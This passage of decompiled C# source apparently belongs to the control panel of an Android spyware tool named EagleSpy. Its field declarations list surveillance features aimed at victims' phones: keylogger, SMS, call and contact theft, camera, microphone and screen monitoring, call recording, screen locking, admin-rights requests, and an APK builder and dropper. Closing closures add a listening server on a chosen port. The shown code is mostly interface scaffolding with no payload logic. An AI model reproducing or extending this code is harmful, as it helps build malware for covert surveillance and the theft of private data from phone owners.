	public Apk_studio ST;

	// Token: 0x04000458 RID: 1112
	public Drooper DR;

	// Token: 0x0400045A RID: 1114
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("notfi")]
	private NotifyIcon _notfi;

	// Token: 0x0400045B RID: 1115
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private System.Windows.Forms.Timer _TOpacity;

	// Token: 0x0400045C RID: 1116
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TopPanel")]
	private Panel _TopPanel;

	// Token: 0x0400045D RID: 1117
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clearbtn")]
	private DrakeUIAvatar _clearbtn;

	// Token: 0x0400045E RID: 1118
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	// Token: 0x0400045F RID: 1119
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	// Token: 0x04000460 RID: 1120
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("infolowtext")]
	private Label _infolowtext;

	// Token: 0x04000461 RID: 1121
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Home_Btn")]
	private DrakeUIButtonIcon _Home_Btn;

	// Token: 0x04000462 RID: 1122
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Build_btn")]
	private DrakeUIButtonIcon _Build_btn;

	// Token: 0x04000463 RID: 1123
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("inject_btn")]
	private DrakeUIButtonIcon _inject_btn;

	// Token: 0x04000464 RID: 1124
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Settings_btn")]
	private DrakeUIButtonIcon _Settings_btn;

	// Token: 0x04000465 RID: 1125
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("searchbtn")]
	private DrakeUIAvatar _searchbtn;

	// Token: 0x04000466 RID: 1126
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("searchtext")]
	private DrakeUITextBox _searchtext;

	// Token: 0x04000467 RID: 1127
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("uncheckbtn")]
	private DrakeUIButtonIcon _uncheckbtn;

	// Token: 0x04000468 RID: 1128
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon8")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon8;

	// Token: 0x04000469 RID: 1129
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("HBlockbtn")]
	private DrakeUIButtonIcon _HBlockbtn;

	// Token: 0x0400046A RID: 1130
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Hinfobtn")]
	private DrakeUIButtonIcon _Hinfobtn;

	// Token: 0x0400046B RID: 1131
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clientfoldrbtn")]
	private DrakeUIButtonIcon _clientfoldrbtn;

	// Token: 0x0400046C RID: 1132
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon9")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon9;

	// Token: 0x0400046D RID: 1133
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon13")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon13;

	// Token: 0x0400046E RID: 1134
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon12")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon12;

	// Token: 0x0400046F RID: 1135
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BlockClientToolStripMenuItem")]
	private ToolStripMenuItem _BlockClientToolStripMenuItem;

	// Token: 0x04000470 RID: 1136
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem1")]
	private ToolStripMenuItem _ToolStripMenuItem1;

	// Token: 0x04000471 RID: 1137
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clearsrchbtn")]
	private DrakeUIAvatar _clearsrchbtn;

	// Token: 0x04000472 RID: 1138
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("supportbtn")]
	private DrakeUIButtonIcon _supportbtn;

	// Token: 0x04000473 RID: 1139
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("locationbtn")]
	private DrakeUIButtonIcon _locationbtn;

	// Token: 0x04000474 RID: 1140
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("keyloggerbtn")]
	private DrakeUIButtonIcon _keyloggerbtn;

	// Token: 0x04000475 RID: 1141
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("callsbtn")]
	private DrakeUIButtonIcon _callsbtn;

	// Token: 0x04000476 RID: 1142
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("micbtn")]
	private DrakeUIButtonIcon _micbtn;

	// Token: 0x04000477 RID: 1143
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("accountbtn")]
	private DrakeUIButtonIcon _accountbtn;

	// Token: 0x04000478 RID: 1144
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("camerabtn")]
	private DrakeUIButtonIcon _camerabtn;

	// Token: 0x04000479 RID: 1145
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("applicationsbtn")]
	private DrakeUIButtonIcon _applicationsbtn;

	// Token: 0x0400047A RID: 1146
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("screenbtn")]
	private DrakeUIButtonIcon _screenbtn;

	// Token: 0x0400047B RID: 1147
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("contactbtn")]
	private DrakeUIButtonIcon _contactbtn;

	// Token: 0x0400047C RID: 1148
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("screenreadbtn")]
	private DrakeUIButtonIcon _screenreadbtn;

	// Token: 0x0400047D RID: 1149
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("filebtn")]
	private DrakeUIButtonIcon _filebtn;

	// Token: 0x0400047E RID: 1150
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("smsbtn")]
	private DrakeUIButtonIcon _smsbtn;

	// Token: 0x0400047F RID: 1151
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	// Token: 0x04000480 RID: 1152
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("FilesToolStripMenuItem")]
	private ToolStripMenuItem _FilesToolStripMenuItem;

	// Token: 0x04000481 RID: 1153
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SMSToolStripMenuItem")]
	private ToolStripMenuItem _SMSToolStripMenuItem;

	// Token: 0x04000482 RID: 1154
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CallsToolStripMenuItem1")]
	private ToolStripMenuItem _CallsToolStripMenuItem1;

	// Token: 0x04000483 RID: 1155
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ContactsToolStripMenuItem")]
	private ToolStripMenuItem _ContactsToolStripMenuItem;

	// Token: 0x04000484 RID: 1156
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("AccountsToolStripMenuItem")]
	private ToolStripMenuItem _AccountsToolStripMenuItem;

	// Token: 0x04000485 RID: 1157
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ApplicationsToolStripMenuItem")]
	private ToolStripMenuItem _ApplicationsToolStripMenuItem;

	// Token: 0x04000486 RID: 1158
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem12")]
	private ToolStripMenuItem _ToolStripMenuItem12;

	// Token: 0x04000487 RID: 1159
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ScreenMonitorToolStripMenuItem")]
	private ToolStripMenuItem _ScreenMonitorToolStripMenuItem;

	// Token: 0x04000488 RID: 1160
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ScreenReaderToolStripMenuItem")]
	private ToolStripMenuItem _ScreenReaderToolStripMenuItem;

	// Token: 0x04000489 RID: 1161
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CameraMonitorToolStripMenuItem")]
	private ToolStripMenuItem _CameraMonitorToolStripMenuItem;

	// Token: 0x0400048A RID: 1162
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("MicrophoneMonitorToolStripMenuItem")]
	private ToolStripMenuItem _MicrophoneMonitorToolStripMenuItem;

	// Token: 0x0400048B RID: 1163
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("KeyloggerToolStripMenuItem1")]
	private ToolStripMenuItem _KeyloggerToolStripMenuItem1;

	// Token: 0x0400048C RID: 1164
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("LiveModeToolStripMenuItem1")]
	private ToolStripMenuItem _LiveModeToolStripMenuItem1;

	// Token: 0x0400048D RID: 1165
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SilentModeGOIPToolStripMenuItem")]
	private ToolStripMenuItem _SilentModeGOIPToolStripMenuItem;

	// Token: 0x0400048E RID: 1166
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("WebBrowserToolStripMenuItem1")]
	private ToolStripMenuItem _WebBrowserToolStripMenuItem1;

	// Token: 0x0400048F RID: 1167
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CallRecorderToolStripMenuItem")]
	private ToolStripMenuItem _CallRecorderToolStripMenuItem;

	// Token: 0x04000490 RID: 1168
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem3")]
	private ToolStripMenuItem _ToolStripMenuItem3;

	// Token: 0x04000491 RID: 1169
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RequestAdminRightsToolStripMenuItem")]
	private ToolStripMenuItem _RequestAdminRightsToolStripMenuItem;

	// Token: 0x04000492 RID: 1170
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("LockScreenToolStripMenuItem")]
	private ToolStripMenuItem _LockScreenToolStripMenuItem;

	// Token: 0x04000493 RID: 1171
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem2")]
	private ToolStripMenuItem _ToolStripMenuItem2;

	// Token: 0x04000494 RID: 1172
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem5")]
	private ToolStripMenuItem _ToolStripMenuItem5;

	// Token: 0x04000495 RID: 1173
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem6")]
	private ToolStripMenuItem _ToolStripMenuItem6;

	// Token: 0x04000496 RID: 1174
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem7")]
	private ToolStripMenuItem _ToolStripMenuItem7;

	// Token: 0x04000497 RID: 1175
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem8")]
	private ToolStripMenuItem _ToolStripMenuItem8;

	// Token: 0x04000498 RID: 1176
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem9")]
	private ToolStripMenuItem _ToolStripMenuItem9;

	// Token: 0x04000499 RID: 1177
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem10")]
	private ToolStripMenuItem _ToolStripMenuItem10;

	// Token: 0x0400049A RID: 1178
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("NotificationListnerToolStripMenuItem")]
	private ToolStripMenuItem _NotificationListnerToolStripMenuItem;

	// Token: 0x0400049B RID: 1179
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CallsListnerToolStripMenuItem")]
	private ToolStripMenuItem _CallsListnerToolStripMenuItem;

	// Token: 0x0400049C RID: 1180
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PhoneInformationToolStripMenuItem")]
	private ToolStripMenuItem _PhoneInformationToolStripMenuItem;

	// Token: 0x0400049D RID: 1181
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem16")]
	private ToolStripMenuItem _ToolStripMenuItem16;

	// Token: 0x0400049E RID: 1182
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem17")]
	private ToolStripMenuItem _ToolStripMenuItem17;

	// Token: 0x0400049F RID: 1183
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem18")]
	private ToolStripMenuItem _ToolStripMenuItem18;

	// Token: 0x040004A0 RID: 1184
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem11")]
	private ToolStripMenuItem _ToolStripMenuItem11;

	// Token: 0x040004A1 RID: 1185
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("KeyboardToolStripMenuItem")]
	private ToolStripMenuItem _KeyboardToolStripMenuItem;

	// Token: 0x040004A2 RID: 1186
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ClientFolderToolStripMenuItem")]
	private ToolStripMenuItem _ClientFolderToolStripMenuItem;

	// Token: 0x040004A3 RID: 1187
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ClientsWindow")]
	private DrakeUIDataGridView _ClientsWindow;

	// Token: 0x040004A4 RID: 1188
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon3")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon3;

	// Token: 0x040004A5 RID: 1189
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon4")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon4;

	// Token: 0x040004A6 RID: 1190
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon6")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon6;

	// Token: 0x040004A7 RID: 1191
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon5")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon5;

	// Token: 0x040004A8 RID: 1192
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Clients_Btn")]
	private DrakeUIButtonIcon _Clients_Btn;

	// Token: 0x040004A9 RID: 1193
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("blockbtn")]
	private DrakeUIButtonIcon _blockbtn;

	// Token: 0x040004AA RID: 1194
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Connection_btn")]
	private DrakeUIButtonIcon _Connection_btn;

	// Token: 0x040004AB RID: 1195
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar1")]
	private DrakeUIAvatar _DrakeUIAvatar1;

	// Token: 0x040004AC RID: 1196
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem14")]
	private ToolStripMenuItem _ToolStripMenuItem14;

	// Token: 0x040004AD RID: 1197
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkupdate")]
	private System.Windows.Forms.Timer _checkupdate;

	// Token: 0x040004AE RID: 1198
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mapworker")]
	private BackgroundWorker _mapworker;

	// Token: 0x040004AF RID: 1199
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Statustimer")]
	private System.Windows.Forms.Timer _Statustimer;

	// Token: 0x040004B0 RID: 1200
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("addpo")]
	private DrakeUIAvatar _addpo;

	// Token: 0x040004B1 RID: 1201
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	// Token: 0x040004B2 RID: 1202
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("bigtitletext")]
	private Label _bigtitletext;

	// Token: 0x040004B3 RID: 1203
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("studiobtn")]
	private DrakeUIButtonIcon _studiobtn;

	// Token: 0x040004B4 RID: 1204
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("notifiaisbtntop")]
	private DrakeUIButtonIcon _notifiaisbtntop;

	// Token: 0x040004B5 RID: 1205
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon11")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon11;

	// Token: 0x040004B6 RID: 1206
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon10")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon10;

	// Token: 0x040004B7 RID: 1207
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon7")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon7;

	// Token: 0x040004B8 RID: 1208
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("serversbtn")]
	private DrakeUIButtonIcon _serversbtn;

	// Token: 0x040004B9 RID: 1209
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("porttext")]
	private DrakeUITextBox _porttext;

	// Token: 0x040004BA RID: 1210
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar2")]
	private DrakeUIAvatar _DrakeUIAvatar2;

	// Token: 0x040004BB RID: 1211
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("rempo")]
	private DrakeUIAvatar _rempo;

	// Token: 0x040004BC RID: 1212
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGVSERVS")]
	private DataGridView _DGVSERVS;

	// Token: 0x040004BD RID: 1213
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar4")]
	private DrakeUIAvatar _DrakeUIAvatar4;

	// Token: 0x040004BE RID: 1214
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar9")]
	private DrakeUIAvatar _DrakeUIAvatar9;

	// Token: 0x040004BF RID: 1215
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar8")]
	private DrakeUIAvatar _DrakeUIAvatar8;

	// Token: 0x040004C0 RID: 1216
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar5")]
	private DrakeUIAvatar _DrakeUIAvatar5;

	// Token: 0x040004C1 RID: 1217
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("AllowAppToolStripMenuItem")]
	private ToolStripMenuItem _AllowAppToolStripMenuItem;

	// Token: 0x040004C2 RID: 1218
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem15")]
	private ToolStripMenuItem _ToolStripMenuItem15;

	// Token: 0x040004C3 RID: 1219
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon14")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon14;

	// Token: 0x040004C4 RID: 1220
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon17")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon17;

	// Token: 0x040004C5 RID: 1221
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon18")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon18;

	// Token: 0x040004C6 RID: 1222
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon19")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon19;

	// Token: 0x040004C7 RID: 1223
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar11")]
	private DrakeUIAvatar _DrakeUIAvatar11;

	// Token: 0x040004C8 RID: 1224
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon16")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon16;

	// Token: 0x040004C9 RID: 1225
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem19")]
	private ToolStripMenuItem _ToolStripMenuItem19;

	// Token: 0x040004CA RID: 1226
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem21")]
	private ToolStripMenuItem _ToolStripMenuItem21;

	// Token: 0x040004CB RID: 1227
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem22")]
	private ToolStripMenuItem _ToolStripMenuItem22;

	// Token: 0x040004CC RID: 1228
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem20")]
	private ToolStripMenuItem _ToolStripMenuItem20;

	// Token: 0x040004CD RID: 1229
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon20")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon20;

	// Token: 0x040004CE RID: 1230
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem24")]
	private ToolStripMenuItem _ToolStripMenuItem24;

	// Token: 0x040004CF RID: 1231
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem23")]
	private ToolStripMenuItem _ToolStripMenuItem23;

	// Token: 0x040004D0 RID: 1232
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripMenuItem25")]
	private ToolStripMenuItem _ToolStripMenuItem25;

	// Token: 0x040004D1 RID: 1233
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("droperbtn")]
	private DrakeUIButtonIcon _droperbtn;

	// Token: 0x040004D2 RID: 1234
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("monitortimer")]
	private System.Windows.Forms.Timer _monitortimer;

	// Token: 0x040004D3 RID: 1235
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UsdtToolStripMenuItem")]
	private ToolStripMenuItem _UsdtToolStripMenuItem;

	// Token: 0x04000611 RID: 1553
	private SoundPlayer soundPlayer;

	// Token: 0x02000058 RID: 88
	// (Invoke) Token: 0x060004B4 RID: 1204
	public delegate void addLogback(object[] objs);

	// Token: 0x02000059 RID: 89
	// (Invoke) Token: 0x060004B8 RID: 1208
	public delegate void deleNotifidgv(object[] objs);

	// Token: 0x0200005A RID: 90
	// (Invoke) Token: 0x060004BC RID: 1212
	public delegate void delecallsidgv(object[] objs);

	// Token: 0x0200005B RID: 91
	// (Invoke) Token: 0x060004C0 RID: 1216
	public delegate void delealertsidgv(object[] objs);

	// Token: 0x0200005C RID: 92
	// (Invoke) Token: 0x060004C4 RID: 1220
	public delegate void deleaddnewrow(object[] obj);

	// Token: 0x0200005D RID: 93
	// (Invoke) Token: 0x060004C8 RID: 1224
	public delegate void updateuiD(object[] objs);

	// Token: 0x02000060 RID: 96
	[CompilerGenerated]
	internal sealed class _Closure_0024__171_002D0
	{
		// Token: 0x060004D3 RID: 1235 RVA: 0x000791F4 File Offset: 0x000773F4
		public _Closure_0024__171_002D0(EagleSpyMain._Closure_0024__171_002D0 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_keyValues = arg0._0024VB_0024Local_keyValues;
			}
		}

		// Token: 0x060004D4 RID: 1236 RVA: 0x00002ACF File Offset: 0x00000CCF
		internal void _Lambda_0024__0()
		{
			Data.MainForm.GlobalMap.HeatMap = this._0024VB_0024Local_keyValues;
			((Control)Data.MainForm.GlobalMap).Update();
		}

		// Token: 0x0400064A RID: 1610
		public Dictionary<string, double> _0024VB_0024Local_keyValues;
	}

	// Token: 0x02000061 RID: 97
	[CompilerGenerated]
	internal sealed class _Closure_0024__210_002D0
	{
		// Token: 0x060004D5 RID: 1237 RVA: 0x0007921C File Offset: 0x0007741C
		public _Closure_0024__210_002D0(EagleSpyMain._Closure_0024__210_002D0 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_portnumber = arg0._0024VB_0024Local_portnumber;
			}
		}

		// Token: 0x060004D6 RID: 1238 RVA: 0x00002AFA File Offset: 0x00000CFA
		internal void _Lambda_0024__0()
		{
			this._0024VB_0024Me.server.Add(new Accept(this._0024VB_0024Local_portnumber));
		}

		// Token: 0x0400064B RID: 1611
		public string _0024VB_0024Local_portnumber;

		// Token: 0x0400064C RID: 1612
		public EagleSpyMain _0024VB_0024Me;
	}

	// Token: 0x02000062 RID: 98
	[CompilerGenerated]
